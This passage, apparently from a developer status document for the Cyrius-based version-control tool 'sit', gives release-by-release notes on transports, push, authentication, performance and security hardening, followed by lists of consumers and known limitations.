/ rewinds / aborted merges leave dangling normally) — exit code is governed solely by integrity errors. CI smoke `Smoke — fsck reachability (v0.8.5)` covers 0 dangling on clean history, 2 dangling (commit + tree) after ref rewind, 0 dangling after merge + delete-feature (proves both-parent walk). Toolchain `5.11.34 → 5.11.55` (21 patches; lib snapshot byte-identical to 5.11.54 so the bump is a tag-line refresh). One known upstream wart: bundled `lib/sandhi.cyr`'s TLS session-cache calls retired `hashmap_*` symbols (renamed `map_*` in 5.11.x); DCE strips them — sit doesn't reach TLS. 127/127 tests; lint clean; binary 1.39 MB (+30 KB vs v0.8.4). **Next: v0.8.6 — wire-walker multi-parent fix or `.sitignore` semantics.** |
| 0.8.4 | 2026-05-13 | **`denyCurrentBranch` default refuse (v0.7.6 footgun closed).** Server-side check in `serve_handle_put_ref` (right after namespace gate, before FF check): if target refname matches `read_head_ref_path()` AND the ref already exists (so initial pushes to empty remotes still work), respond `423 Locked` instead of writing. New `_remote_current_branch` helper in `src/wire.cyr` enforces the same gate over file://. Push helpers (`http_remote_push_ref` / `ssh_remote_push_ref`) gained a third return code (`2 = denyCurrentBranch`); `_do_push_*` surface a distinct user-visible message ("server refuses to update its checked-out branch (denyCurrentBranch)") rather than the misleading "non-fast-forward". **Cross-repo block surfaced**: HTTPS/mTLS slots blocked on sandhi's `tls_policy/` being libssl-via-fdlopen (verified against sandhi 1.3.4 / cyrius 5.11.34 / ADR 0007); filed at `issues/archived/2026-05-13-sandhi-first-party-tls-surface-needed.md`. v0.8.x slot table reshuffled — next is v0.8.5 (fsck reachability), then v0.8.6 (.sitignore semantics), then v0.8.7 (log --graph + shallow clone). 127/127 tests; lint clean; binary flat at 1.36 MB. |
| 0.8.3 | 2026-05-13 | **Push over SSH.** `sit push origin main` works over `ssh://` URLs. Pipeline mirrors v0.7.6 HTTP push (capabilities probe → FF preflight → walk reachable → per-object POST → ref POST → up-to-date short-circuit) but layered onto v0.8.2's persistent SSH stdio session — one ssh handshake per push. New surface in `src/wire_ssh.cyr`: `_wire_ssh_post_xhdr`, `_wire_ssh_recv_response` (extracted so GET + POST share response-parsing), `ssh_remote_push_object` / `ssh_remote_push_ref`. New `_do_push_ssh` in `src/wire.cyr`; `cmd_push` dispatches ssh; `wire_transport_check_writable` accepts ssh. Server-side handlers (POST objects + POST refs) are transport-agnostic — the v0.7.6 rehash-verify + FF-gate logic carries over unchanged. Bearer auth over SSH skipped (SSH already authenticates end-to-end); `_ssh_handle_auth_token` returns 0 stub. CI smoke extended with full push roundtrip + "everything up-to-date" + non-FF rejection. 127/127 tests; lint clean; binary flat at 1.36 MB. **Next: v0.8.4 — HTTPS via sandhi first-party Cyrius TLS** (ADR 0007 gate). |
| 0.8.2 | 2026-05-13 | **SSH transport (`ssh://`), read-only.** Closes ADR 0007's encrypted-over-internet read-side gap. `sit clone ssh://user@host/path` works end-to-end. New `sit serve --stdio` mode (pipelining-safe HTTP/1.1 parser reading stdin / writing stdout, no socket). New `src/wire_ssh.cyr` (~530 lines): fork+exec on `ssh user@host -- sit serve <path> --stdio`, bidirectional pipes via `sys_pipe` × 2, raw `sys_execve` after walking $PATH for ssh. `obj_src` gains `OBJ_SRC_SSH = 2`; transport-agnostic walk/copy paths unchanged. [ADR 0008](../adr/0008-ssh-transport.md) pins the process-boundary architecture (no libssh-link, no FFI). CVE-2017-1000117 three-layer defense (URL-body whitelist → `_ssh_parse_url` explicit leading-dash rejection → `--` argv sentinel + no-shell exec). Env curated to HOME / USER / LOGNAME / SSH_AUTH_SOCK / TERM / PATH (no full-env inheritance). `fuzz_ssh_url_parser` 100K rounds clean; CI sshd-loopback smoke stands up sshd on `127.0.0.1:22422` and asserts clone + CVE-injection rejection. **Push over SSH still gated** ("requires sit 0.8.3+"); HTTPS / mTLS blocked on first-party Cyrius TLS in sandhi. 127/127 tests pass; lint clean; binary 1.36 MB. |
| 0.8.1 | 2026-05-13 | **Library export (`dist/sit.cyr`) + diff primitive cleanup (owl-blocker resolved).** Sit consumable as a Cyrius dep: `[deps.sit] tag = "0.8.1" modules = ["dist/sit.cyr"]`. New `[lib].modules` block in `cyrius.cyml` drives `cyrius distlib` (sandhi-shape); generated bundle is 9,765 lines, tracked in-repo. Public surface (93 lines in new `src/api.cyr`): `sit_repo_open` / `sit_repo_close` / `sit_diff_path` (HEAD-blob vs working-tree → annotated-ops vec) + the existing `ann_*` accessors in `src/diff.cyr`. Diff cleanup: `cmd_diff` / `cmd_show` parse `-U<N>` and thread `ctx` through `print_file_diff` → `group_hunks` (was hardcoded to 3 — 13 callers updated). Pure compute layer `compute_file_diff` extracted from `print_file_diff` so consumers can ask for ops without paying for stringification. **ADR 0009** locks the public-API contract: `sit_*` / `ann_*` are stable + SemVer-governed; everything else in the bundle is internal. CI: `Verify dist/sit.cyr is in sync` step (asserts `cyrius distlib` idempotent vs tracked bundle; asserts public symbols present); `Smoke — diff -U<N>` step (asserts U0 / U1 / default-ctx hunk-header byte-shape vs git). 127/127 tests pass; lint clean; binary flat at 1.30 MB. **owl** can now drop the `execve("git", "diff", "-U0", "--", path)` shell-out for a `sit_diff_path` library call. |
| 0.8.0 | 2026-05-12 | **Line opener: cyrius 5.11.34 toolchain refresh + dep major bumps + CI lint/fuzz.** cyrius `5.9.37 → 5.11.34` (spans 100+ patches; load-bearing: v5.10.x SLOT 19 transitive deps, v5.11.33 PP cap raise 2 MB → 8 MB, v5.11.29–34 ELF section-header fixes). Dep bumps: sakshi `2.1.0 → 2.2.4`, sankoch `2.1.0 → 2.2.5`, sigil `2.9.3 → 3.1.1` (major — `ct_eq` retired in favor of stdlib `ct_eq_bytes_lens`; sit audit clean since only `hash_data` / `hex_*` / ed25519 verbs called), patra `1.8.3 → 1.9.4`. `lib/` + `src/lib/` + `cyrius.lock` untracked from git (build artifacts; gitignored — mirrors sandhi/cyim convention). 40 stale `lib/*.cyr` files + `cyrius.lock` removed via `git rm --cached`. CI gains `Lint` step (per-file `cyrius lint` with 120-char divider tolerance, hard-fails on other warns — cyim shape) and `Fuzz` step (`cyrius run tests/sit.fcyr`; 5 harnesses, ~60s on bench host). CI install step adopts the modern `install.sh` one-liner (sigil/sandhi pattern) — lays out `$HOME/.cyrius/versions/$VER/{bin,lib}` plus flat symlinks at `$HOME/.cyrius/{bin,lib}`. CI "Resolve dependencies" cp's `$HOME/.cyrius/lib/*` into `./lib/` directly (cc5's preprocessor reads from `./lib/`), then runs `cyrius deps` for [deps.X] git crates. One source change: `src/config.cyr:176` consecutive blank lines collapsed. Stdlib list grew: added `base64` / `mmap` / `dynlib` / `fdlopen` (sandhi v1.3.2 TLS 1.3 0-RTT transitives; cyrius v5.10.x SLOT 19's transitive include doesn't follow enum / constant refs). Filed + resolved cross-repo at cyrius v5.11.33 (cap raise 2 MB → 8 MB; issue archived). Tests / lint / fuzz green; DCE binary **1.30 MB** flat from v0.7.6. |
| 0.7.6 | 2026-05-08 | **HTTP push + bearer auth + ADR 0007 (no libssl, ever).** Closes the symmetric round trip over HTTP. Server: `POST /sit/v1/objects/<hex>` rehashes via sigil before insert (trust boundary on incoming bytes); `POST /sit/v1/refs/<refname>` FF-gates via `is_ancestor_in_db` for `refs/heads/*`, refuses non-FF with 409, refuses `refs/remotes/*` always, treats `refs/tags/*` as immutable. `--require-auth` flag enforces strict 0600 perms on `~/.sit/serve.token`, refuses to start on any check failure. Constant-time bearer compare. Reads stay anonymous in both modes. Client: `cmd_push` branches on URL scheme; `_do_push_http` runs full pipeline with capabilities probe → optional token load → FF preflight → walk reachable → per-object POST → ref POST → "everything up-to-date" short-circuit. **ADR 0007**: no libssl, no libcrypto, no exception. HTTPS via libssl will not ship; first-party Cyrius TLS is the only path that unlocks `https://` later. SSH (v0.7.7) is the canonical encrypted-over-internet transport (process boundary, not FFI). 127/127 tests pass. CI smoke covers full push roundtrip + 401 cases + anonymous-read-against-auth-required-server. file:// no regression. DCE binary: 1.30 MB. |
| 0.7.5 | 2026-05-08 | **Walk-side phasing + cache-aware tree walk + frame-decoder fuzz.** Realises the v0.7.4 protocol scaffolding into actual clone speedup. New `walk_reachable_phased` (3 phases: sequential commit chain → batch-prefetch all collected trees → walk each from cache with per-level sub-tree batching) + `walk_reachable_tree_batched` (cache-first via new `_decompress_raw_into` so cache hits decompress without re-fetching). Old sequential walkers deleted (~95 lines). `obj_src_batch_prefetch` re-enabled in `copy_objects`. Frame decoder extracted as `_wire_http_decode_frames`; `fuzz_want_frame_decoder` runs **10M iterations clean** (~46 s). **Bench: 213 → 185 ms loopback (−13%); projected 42% at 1 ms RTT, 51%+ at 2 ms+ — gate met for any RTT ≥ ~0.5 ms.** Per-RT cost extracted: 0.14 ms/RT on loopback (28 ms saved by replacing 198 round trips with the batch path). file:// no regression (166 ms). 127/127 tests; aarch64 cross clean; lint at the pre-existing one warning. DCE binary: 1.29 MB. Push-side endpoints + bearer auth deferred to v0.7.6+ to land alongside or after TLS so tokens never travel in clear. |
| 0.7.4 | 2026-05-08 | **`POST /sit/v1/want` protocol scaffold (no perf change).** Server endpoint live with full validation (length math, `SIT_WANT_MAX_COUNT = 512` cap, `hex_prefix_valid` on every requested hash, status mapping 200/400/411/413/500). Capabilities advertise `"batch":true,"batch_max":512`. ADR 0006 pins the request + response frame format (request: `[8B count][count×64 hex]`; response: per-frame `[64 hex][8B ty][8B clen][clen bytes compressed]`; LE; ASCII hex; no per-frame magic). Client primitives (`_wire_http_post`, `http_remote_check_batch`, `http_remote_read_batch`, `obj_src_batch_prefetch`) ship in source as scaffolding — DCE-stripped because the integration into `copy_objects` is intentionally held: on the 100-commit / 100-file loopback fixture, batching only the cache-miss blobs saved 7% (213 → 198 ms) — well under the v0.7.4 ≥30% gate. The walk-side phasing that unlocks the headline win moves to v0.7.5; shipping the wire format + primitives now means that release is plumbing, not protocol design. Per-object http clone unchanged from v0.7.3 (213 ms median, 300 objects fsck-clean). 127/127 tests pass. DCE binary: 1.28 MB. |
| 0.7.3 | 2026-05-08 | **HTTP client transport (fetch + clone over `http://`).** Closes the v0.7.x server/client read-only round trip. Adds `GET /sit/v1/objects/<hash>` (server, with `X-Sit-Type: <int>` header carrying the patra type code), `src/wire_http.cyr` (530-line client built directly on `lib/net.cyr` to dodge stdlib `http_get`'s 64 KiB recv cap; growing fl_alloc-backed recv buffer up to 16 MiB matching `db_object_read_both`'s decompression ceiling), and the `obj_src` abstraction in `wire.cyr` so `walk_reachable_*` / `copy_objects` run unchanged over either patra-DB or HTTP source. `wire_transport_check` split into `_readable` (file + http) and `_writable` (file only — push over http requires v0.7.5+). Toolchain: cyrius 5.8.51 → 5.9.37, picks up the cc5_aarch64 cap-propagation fix; aarch64 cross-build now produces a real 1.45 MB binary. End-to-end smoke on a 100-commit / 100-file fixture: `sit clone http://127.0.0.1:8484` → `sit fsck` clean (300/300 objects), 211 ms vs 167 ms file:// = **1.26×** (success gate was 3×). 127/127 tests pass; CI gains a new `sit serve + http clone + fsck` smoke step. Issue archived: `2026-05-04-cyrius-cc5-aarch64-token-cap-not-propagated.md` — RESOLVED. DCE binary: 1.30 MB. |
| 0.7.2 | 2026-05-04 | **`sit serve` skeleton + sandhi opt-in.** First feature-bearing release of the v0.7.x network-transport line. New `cmd_serve` + `src/serve.cyr` (255 lines) wired into `src/lib.cyr`; `GET /sit/v1/capabilities` and `GET /sit/v1/refs` live, loopback-only, read-only. Toolchain 5.7.1 → 5.8.51 picks up the v5.8.46 token-array cap raise (262144 → 1048576) that finally lets `"sandhi"` + transitive `net`/`tls`/`ws`/`http`/`json` ship in `[deps].stdlib`. Two sit-side bugs caught in smoke: `serve_read_ref_file` `<= 0` → `< 0` (`read_file_heap` returns 0 on success); `serve_emit_refs_subtree` Str/cstring boundary on `dir_walk`. Wire-transport error strings synced for v0.7.2 (http client now → 0.7.3+). 127/127 tests pass; DCE binary 1.28 MB (+576 KB vs v0.7.0; sandhi residue dominates). |
| 0.7.1 | 2026-04-25 | **URL scheme detection + dispatch stubs.** Added `url_scheme()`, `url_authority_path_valid()`, `wire_transport_check()`. Extended `remote_url_valid()` to accept http/https/ssh URL shapes (transport not wired). `cmd_clone` / `do_fetch` / `cmd_push` dispatch on scheme; non-file schemes return clean per-scheme error naming the upcoming v0.7.x patch. **127/127 tests pass** (101 + 26 new), 10K-round fuzz clean on validators. Sandhi opt-in deferred to v0.7.2 (needs `net`/`tls`/`ws`/`http`/`json` co-add and a real caller). DCE binary 709 KB. |
| 0.7.0 | 2026-04-25 | **v0.7.x line opener — toolchain-only unlock.** cyrius 5.6.43 → 5.7.0 (the sandhi fold; `sandhi` v1.0.0 vendored into stdlib as `lib/sandhi.cyr`, `lib/http_server.cyr` deleted from stdlib). Deleted local orphan `lib/http_server.cyr` (zero callers; cyrius 5.7.0's downstream worklist names sit for "delete orphan only"). Build clean, 101/101 tests pass, DCE binary 707 KB (down from 710). No `[deps.sandhi]` added — sit has no HTTP code today; sandhi now bundles in stdlib and is opt-in via `"sandhi"` in inline `[deps].stdlib` when feature work begins. v0.7.1 is the first feature-bearing patch in the line. |
| 0.6.12 | 2026-04-25 | **Biggest single-release win of the v0.6.x arc.** Pure dep bumps: cyrius 5.6.40 → 5.6.43, **sigil 2.9.1 → 2.9.3 (SHA-NI hardware path)**, sankoch 2.0.3 → 2.1.0. Sigil SHA-256 throughput 32× on 64 KB inputs (12 MB/s → ~400 MB/s). Cascades to **`add-64KB` -41%** (16.40 → 9.62 ms) and **`add-1MB` -48%** (211.52 → 112.39 ms). `status` -8%. No sit source changes. Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.12.md`. |
| 0.6.11 | 2026-04-25 | P-20: `parse_index` query gains `ORDER BY path` so downstream `sort_entries` falls through O(N) on already-sorted input (was O(N²) insertion sort). ~50µs saved per call at 100 entries; scales to ~500ms at 10K. No 100-fixture bench movement. Multi-insert transaction wraps in `cmd_commit` and `rewrite_index` investigated and reverted — 5-10% regression on modern SSDs (per-txn setup overhead exceeds saved fsyncs at small batch sizes). Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.11.md`. |
| 0.6.10 | 2026-04-25 | Dep bumps: cyrius 5.6.35 → 5.6.40, patra 1.6.0 → 1.8.3. Closes S-31 by adopting `patra_result_get_str_len` natively (removes sit's `strnlen(s, 256)` workaround). patra `PATRA_SYNC_BATCH` investigated and reverted (durability regression w/o perf gain; reasoning documented at the call sites). No bench movement. Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.10.md`. |
| 0.6.9 | 2026-04-25 | P-06 + P-15. Decompression: initial multiplier 16× → 4× across read_object / migrate / db_object_read_both; retry only on confirmed `-ERR_BUFFER_TOO_SMALL`. LCS: DP table via `fl_alloc` + `fl_free` (mmap-backed, returns to kernel post-diff instead of squatting on bump heap). Both hygiene; no synthetic-bench movement. **Closes the sit-side v0.6.x perf arc.** Final cumulative 0.6.0 → 0.6.9: `log` -18%, `clone` -30%. Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.9.md`. |
| 0.6.8 | 2026-04-25 | P-17: buffered stdout. 206 direct `syscall(SYS_WRITE, STDOUT, ...)` sites across 9 src files swapped to a single buffered `stdout_write(data, len)` helper backed by a 64KB heap buffer. `main.cyr` trailer flushes before `SYS_EXIT`. STDERR stays direct. `write_sanitized` rewritten to batch a sanitized copy through `stdout_write` (was 1 syscall/char + buffer bypass). Caught and fixed an output-ordering bug along the way (`print_commit_header` was emitting author bytes before the "Author: " prefix). No 100-file bench movement (fixture too small); structural benefit + visible win at scale (1000+ line diffs). Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.8.md`. |
| 0.6.7 | 2026-04-25 | P-04: walk-reachable now captures the compressed bytes it pulled (via new `db_object_read_both` helper) and shares them with `copy_objects` via a `raw_cache` map. Commits + trees no longer re-read from source — 500 SQL ops on the 100-commit fixture drop to 300. **`sit clone-100commits` −21.7%** (215.27 → 168.53 ms; 13.64x git → 11.08x git). Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.7.md`. |
| 0.6.6 | 2026-04-25 | P-10 + P-18: `tree_find` lazily builds a name → entry hashmap (cached by entries-vec pointer) instead of O(N) linear scan; `three_way_path_set` uses `map_has` for dedup instead of nested O(N²) streqs. No measurable improvement on the 100-file synthetic bench — too small to show — but algorithmic complexity dropped from O(N²) to O(N) on the hot paths. Real win at 1000+ files (cmd_status projected ~5ms → ~0.3ms at 1000 files). Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.6.md`. |
| 0.6.5 | 2026-04-25 | P-03: `copy_objects` batched into a single `patra_begin`/`patra_commit` transaction; redundant outer `db_object_has` dropped (was paying for 2 SELECTs per object, now 1); `db_object_insert_raw` return convention extended to distinguish "newly inserted" from "already present" so the wire-side `copied` counter is accurate. **`sit clone` -15%** (245 → 208 ms; 16.13x git → 13.82x git). Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.5.md`. Bigger clone wins still gated on patra-side group-commit + UPSERT (filed on patra's roadmap). |
| 0.6.4 | 2026-04-25 | First v0.6.x perf release. Process-wide patra-handle caching for `.sit/objects.patra` + `.sit/index.patra` (P-01/02/05/08/12/25). S-24 fold-in: SQL-string allocs in object_db swapped to `fl_alloc`/`fl_free`; read_object's single-exit shape fell out for free. `sit log` -17% on a 100-commit walk; status / clone unchanged (bottlenecks are downstream). Bench snapshot at `docs/benchmarks/2026-04-25-v0.6.4.md`. |
| 0.6.3 | 2026-04-25 | LOW-severity batch + audit closeout. `strnlen` added to util.cyr; `parse_index`'s `patra_result_get_str` walk now bounded at 256 (S-31). S-28 confirmed already addressed by stdlib's empty-envp `exec_vec`. S-32 documented as a Cyrius compile-time invariant in `docs/architecture/004-*.md` (Cyrius string literals are program-lifetime; tree.cyr's mode-pointer pattern is safe). 2026-04-24 P(-1) audit fully closed; only S-24 deferred (folds into v0.6.x patra-cache refactor). |
| 0.6.2 | 2026-04-25 | Security hygiene MEDIUM batch from the 2026-04-24 audit. `alloc_or_die` helper + 52-site swap (S-17). Materialize / merge / commit / clone now fail loudly on FS-mutation errors instead of silently producing partial state (S-16, S-27). Author-line + sitsig parsers hardened against integer overflow + partial hex decode (S-18, S-19, S-20). `cmd_clone` requires `--force-absolute` for absolute targets (S-23). Index-migrate caps per-line path length at 4096 (S-22). Latent `ensure_dirs_for` mkdir("") bug removed (S-25). |
| 0.6.1 | 2026-04-25 | S-33 fix release. Pure dep-pin bumps — sankoch 2.0.1 → 2.0.3 (zlib symmetry) + cyrius 5.6.25 → 5.6.35 (allocator grow defense-in-depth). Status / fsck / clone clean on 100-commit / 100-file fixture. `bench_status` + `bench_clone` re-enabled. New `docs/development/issues/` for upstream-bug writeups. |
| 0.6.0 | 2026-04-24 | Security hardening: all CRITICAL + HIGH findings from the 2026-04-24 P(-1) audit fixed. `validate.cyr` with every input validator. Tree-entry / refname / hex / config / URL gating. Symlink guards on clone paths. Output escape filter. 101 assertions (from 31). 3 new ADRs. |
| 0.5.1 | 2026-04-24 | File-split refactor: `src/main.cyr` → 11 topical modules via `src/lib.cyr`. Zero feature changes. |
| 0.5.0 | 2026-04-24 | Wire protocol (local-path): `remote`, `fetch`, `pull`, `push`, `clone` + nested branch names + `sit merge -S` + `resolve_ref_name` sees `refs/remotes/*`. |
| 0.4.0 | 2026-04-24 | First official release. Rolls up the entire pre-release development arc (scaffold → local VCS → signed commits) into a single tagged artifact. |

Full history in [`CHANGELOG.md`](../../CHANGELOG.md). Forward-looking items in [`roadmap.md`](roadmap.md).

## Consumers / integration

- **Dist bundles (two profiles):** `dist/sit.cyr` (full, `[lib]` → `cyrius distlib`) is the default for consumers needing the write/sync surface; **`dist/sit-read.cyr`** (lean read-only, `[lib.read]` → `cyrius distlib read`, **v1.3.0**) is for report-only consumers — it drops `sign` + the network stack so it compiles into a consumer with no shim constants and no wire warnings. Both are tracked in-repo and regenerated together when a shared read-path module changes (CLAUDE.md Work-Loop step 8).
- **thoth** (pre-1.0, downstream) — its status bar / tool-call diffs consume the **read profile** (`dist/sit-read.cyr`) for branch / status / diff via the `sit_repo_*` API (0.13.0 git producer). Vendors sankoch as its own dep for the git-object inflate path.
- **owl** (pre-1.0, downstream) — consumes sit for git-marker gutter decorations once both ship. sit's `owl-file` command falls back to raw content when owl isn't on PATH. A candidate to move onto the read profile alongside thoth.

## Known limits (current)

Live constraints a reader should know about, not a graveyard. Every entry that
was here through v1.3.5 was struck-through and closed (v0.8.4–v0.8.13), and the
section pointed at a `roadmap.md` heading that no longer exists — both removed at
v1.4.0. Closed items live in [`CHANGELOG.md`](../../CHANGELOG.md).

- **`_wildmatch` is bounded, not polynomial.** v1.3.8 capped the ignore
  matcher's catastrophic backtracking with a 200k-step budget per match
  (exhaustion = "no match", the safe direction). The algorithm is still
  worst-case exponential; it just cannot spend more than the budget proving it.
  Memoization is the real fix — see the roadmap for why it wasn't taken.
- **Fuzzing cannot see out-of-bounds READS.** `alloc` has no redzones, so an
  overread that lands in mapped memory produces no fault and no harness signal.
  This is how a 127-byte heap disclosure survived 10M fuzz rounds/run until the
  2026-08-17 audit read the code. Filed upstream on cyrius
  (`2026-08-18-fuzz-cannot-see-oob-reads-from-sit`); until it lands, OOB reads
  are covered by deterministic corpora, not by `cyrius fuzz`.
- **aarch64 cross-build fails.** `src/wire_ssh.cyr`'s `SYS_ACCESS` has no
  aarch64 equivalent (only `faccessat`); the site's `#ifndef CYRIUS_TARGET_AGNOS`
  gate covers AGNOS but not aarch64. `release.yml` catches it and ships x86_64
  only. Same class as the archived `SYS_OPEN` blocker.
- **`.git/` support is read-only and CLI-partial.** No write-back by design. The
  *library* API works on git repos; the `status` / `log` / `diff` CLI commands
  stay `.sit`-gated (roadmap: `.git/` CLI parity).
- **Reflog entries never expire.** So `fsck --prune` reclaims reflog-protected
  objects only via `--prune-now`. `reflog expire` is on the roadmap.
